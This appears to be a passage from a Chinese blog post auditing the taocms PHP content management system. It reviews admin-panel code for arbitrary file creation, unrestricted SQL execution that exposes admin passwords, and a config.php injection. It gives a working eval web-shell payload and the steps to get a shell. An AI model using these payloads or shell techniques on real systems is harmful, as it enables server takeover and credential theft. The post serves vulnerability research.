<p>做到了<table><tr><td bgcolor="yellow">任意文件下载。</td></tr></table></p>
<hr>
<hr>
<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="upload？"><a href="#upload？" class="headerlink" title="upload？"></a>upload？</h3><p>在管理界面到处找找，于是找到<strong>上传</strong>这个东西，打开:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E4%B8%8A%E4%BC%A0%E7%95%8C%E9%9D%A2.png" class title="上传">


<p>用php文件测试一下</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95.png" class title="上传">


<p>as you can see:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//upload.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$inputname</span><span class="token punctuation">,</span><span class="token variable">$attachdir</span><span class="token operator">=</span><span class="token string single-quoted-string">'pictures/'</span><span class="token punctuation">,</span><span class="token variable">$urldir</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$dirtype</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$maxattachsize</span><span class="token operator">=</span><span class="token number">10097152</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token variable">$upext</span><span class="token operator">=</span><span class="token string single-quoted-string">'txt,rar,zip,jpg,jpeg,gif,png,swf,wmv,avi,wma,mp3,mid,jar,jad,exe,html,htm,css,js,doc'</span><span class="token punctuation">;</span><span class="token comment">//上传扩展名</span>
		<span class="token variable">$err</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
		<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
		<span class="token variable">$upfile</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$inputname</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$fileinfo</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过pathinfo()获取文件扩展名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>白名单很难绕过</p>
<p>而<code>pathinfo()</code></p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">name = example.png
Array
(
    [dirname] => .
    [basename] => example.jpg
    [extension] => jpg
    [filename] => example
)

name = test.php.png
Array
(
    [dirname] => .
    [basename] => test.php.png
    [extension] => png
    [filename] => test.php
)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或许文件包含？不过在那之前先看另一个界面， <strong>新建文件&#x2F;文件夹</strong></p>
<h3 id="create？"><a href="#create？" class="headerlink" title="create？"></a>create？</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//File.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请填写文件名/文件夹名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">realpath</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isdir'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'目录'</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
			<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'文件'</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'新建'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$info</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'新建'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'成功'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'admin.php?action=file&amp;ctrl=lists&amp;path='</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大致看一遍会发现，对于建立的文件没有任何限制，所以就新建 <code>ice.php</code>然后写入：</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/ice.png" class title="新建文件">

<p>然后用菜刀之类的工具，URL填的就是<code><a href="http://taocms/ice.php">http://taocms/ice.php</a></code>,密码填 cmd ，ok，连上。<br>如果直接访问<code><a href="http://taocms/ice.php">http://taocms/ice.php</a></code>其实什么也看不到，稍微修改一下<code>ice.php</code>里面写入的内容就可以实现其他的操作了。<br><br></p>
<p>有趣的是，由于这个cms里面管理员后台可以对所有文件进行查看和编辑，所以前面那个对于文件上传的白名单完全可以被修改，也不用费力气去找其他突破点。LOL。<br><br></p>
<hr>
<hr>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>有一个执行SQL，所以去看看</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//sql.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">excute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$creatTable</span><span class="token operator">=</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">magic2word</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sqltext'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//传入的SQL语句作为sqltext的值&lt;</span>
		<span class="token variable">$db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Dbclass</span><span class="token punctuation">(</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token constant">DB_NAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建新db类</span>
		<span class="token variable">$o</span><span class="token operator">=</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$creatTable</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用query执行传入的SQL语句&lt;</span>
		<span class="token keyword">echo</span><span class="token string single-quoted-string">'&lt;pre>'</span><span class="token punctuation">;</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">execmsg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'执行SQL'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'?action=sql&amp;ctrl=display'</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//execmsg()只负责报信</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一样的，对所执行的SQL语句没有什么限制。</p>
<h4 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h4><ul>
<li>1.<code>show tables;</code><img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/showtables.png" class title="SQL1"></li>
</ul>
<p>可以得知：<br>1.database name &#x3D; <code>taocms</code><br>2.表名是<code>cms_admin</code></p>
<ul>
<li>2.<code>select * from cms_admin;</code><img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/showcolumns.png" class title="SQL2">
这里有趣的是，在 用户修改 这个模块里看不到的管理员密码就这么找到了。要说有什么用，目前我也没看出来。<p></p><hr></li>
</ul>
<p>有个添加用户的，也许会有越权？</p>
<hr>
<hr>

<h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><p>如果搞过一点类似cms或者blog的搭建，都会知道config这个名字意味着这个文档是关于整个system的配置。</p>
<p>as you can see:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F.png" class title="管理系统">

<p>对于config一类文档，考虑的问题在于：</p>
<ul>
<li><table><tr><td bgcolor="yellow">是否可以写入</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">是否可以访问</td></tr></table></li>
</ul>
<hr>
<h2 id="update"><a href="#update" class="headerlink" title="update()"></a>update()</h2><p>查看<code>config.php</code><br>里面有三个function，第三个看起来就是毫无利用价值的，第一个太复杂，先说第二个<code>update()</code>。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">function update()&#123;
        //这行代码检查`config.php`文件是否可写。如果不可写，它将显示一条消息，指出没有修改配置文件的权限。
		is_writable(SYS_ROOT.'config.php')||Base::showmessage('无权限修改配置文件');

        //这行代码从`$_POST`数组中移除`Submit`、`ctrl`和`action`键，这可能是为了确保这些键不会被写入配置文件。
		unset($_POST['Submit']);unset($_POST['ctrl']);unset($_POST['action']);
        
        //接下来的几行代码创建一个新的配置文件内容。它遍历`$_POST`数组中的每个键值对，并为每个键创建一个定义语句。这些定义语句将被写入配置文件。$key是键。$configs是键值，然后用Base::safeword对$config进行安全检查
		$configData="<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\r\n<span class="token string double-quoted-string">";
		foreach(<span class="token interpolation"><span class="token variable">$_POST</span></span> as <span class="token interpolation"><span class="token variable">$key</span></span>=><span class="token interpolation"><span class="token variable">$configs</span></span>)&#123;
			<span class="token interpolation"><span class="token variable">$configData</span></span>.="</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'".$key."'</span><span class="token punctuation">,</span>	<span class="token string single-quoted-string">'".Base::safeword($configs)."'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\r\n<span class="token string double-quoted-string">";
		&#125;
		<span class="token interpolation"><span class="token variable">$configData</span></span>.="</span><span class="token delimiter important">?></span></span>";

        //将新的配置文件内容写入`config.php`文件。
		$status=file_put_contents(SYS_ROOT."config.php",$configData);
		Base::execmsg("保存设置","?action=".$this->table.'&amp;ctrl=display',TRUE);
	&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<br>

<p>不用特别仔细看就可以从<code>unset()</code>这里知道参数以 <strong>POST</strong> 方法传入。以及这个文件可以写入，不过是有条件的写入。以及得到了传入的$_POST的值的$configs自带<code>&lt;?php</code> 和 <code>?&gt;</code>，指明构造PHP version的payload。<br><br></p>
<p>由第三个注释知道，重点在于<code>foreach()</code>中，然后就是<code>Base::safeword()</code>如何进行检查？</p>
<hr>
<h2 id="safeword"><a href="#safeword" class="headerlink" title="safeword()"></a>safeword()</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//Base.php</span>

	<span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">safeword</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token variable">$level</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token comment">//是否为数组</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token comment">//键为$key，键值为$value</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$text</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//结果存入$safeword，这也是一个数组。</span>
				<span class="token variable">$safeword</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">safeword</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
        <span class="token comment">//不是数组进行switch</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#123;</span>
				<span class="token comment">//不进行处理</span>
                <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token variable">$text</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//转整数</span>
				<span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//移除所有HTML标签</span>
				<span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//将特殊字符转化为HTML实体，并将换行符转换为&lt;br/>标签</span>
				<span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token comment">//添加'来转义$text中出现的单引号，移除关键词与符号select, union,=，避免SQL Injection</span>
				<span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$safeword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"union"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$safeword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$safeword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token keyword">default</span><span class="token punctuation">:</span><span class="token comment">//默认level=8时为default</span>

                    <span class="token comment">//如果数据库类型是Sqlite，将$text中出现的单引号都替换为两个单引号。</span>
					<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token constant">DB</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'Sqlite'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
						<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"''"</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
                    <span class="token comment">//不是Sqlite，就用_addslashs()来处理$text.该函数静态调用addslashs()函数处理$text</span>
					<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
						<span class="token variable">$safeword</span><span class="token operator">=</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">_addslashs</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
			
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> <span class="token variable">$safeword</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><p><code>addslashes()</code>函数：在PHP中，<code>addslashes()</code>函数的主要作用是在预定义字符前添加反斜线。预定义字符包括单引号(‘)，双引号(“)，反斜线()和NULL。</p>
</li>
<li><p>将特殊字符转化为HTML实体，并将换行符转换为<code>&lt;br/&gt;</code>标签：在PHP中，可以使用<code>htmlentities()</code>函数将字符转换为HTML实体。这样做的目的是防止跨站脚本攻击（XSS），并确保文本在HTML文档中正确显示。例如，如果你的文本中包含<code>&lt;</code>或<code>&gt;</code>等字符，它们可能会被浏览器误解为HTML标签。通过将这些字符转换为HTML实体，你可以确保它们会被正确地显示为文本，而不是被解析为HTML代码。同样，<code>nl2br()</code>函数可以将字符串中的换行符转换为HTML的<code>&lt;br/&gt;</code>标签，这样在HTML文档中就可以正确地显示换行了。</p>
</li>
<li><p>将单引号替换为两个单引号：在SQLite中，单引号是字符串的界定符。如果字符串中包含单引号，SQLite可能会将其误解为字符串的结束，从而导致错误。为了避免这种情况，将字符串中的单引号替换为两个单引号。这样，SQLite就会知道这是一个字面上的单引号，而不是字符串的结束。</p>
</li>
</ol>
<br>
<br>

<p>在了解完这些代码在说什么之后，发现除了level 8这个default，其他都有较为严苛的限制。而在default中，有一个if else的限制，<code>Base::_addslashs()</code>不能绕过，就focus on <strong>Sqlite</strong>。</p>
<h2 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h2><p>构造payload：<br><code><code>\</code>';@eval($_REQUEST[1];/*</code></p>
<p>$safeword之后</p>
<p><code>\&#39;&#39;;@eval($_REQUEST[1];/*</code></p>
<p>与<code>congig.php</code>中WEBINFO define的<code>&#39;</code>进行闭合，让PHP代码逃逸进而成功写入。</p>
<p>然后访问<code>http://taocms/config.php?1=phpinfo();</code><br>getshell成功。</p>
<p>最后的<code>/*</code>也可以写成<code>//</code></p>
<hr>
<hr>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
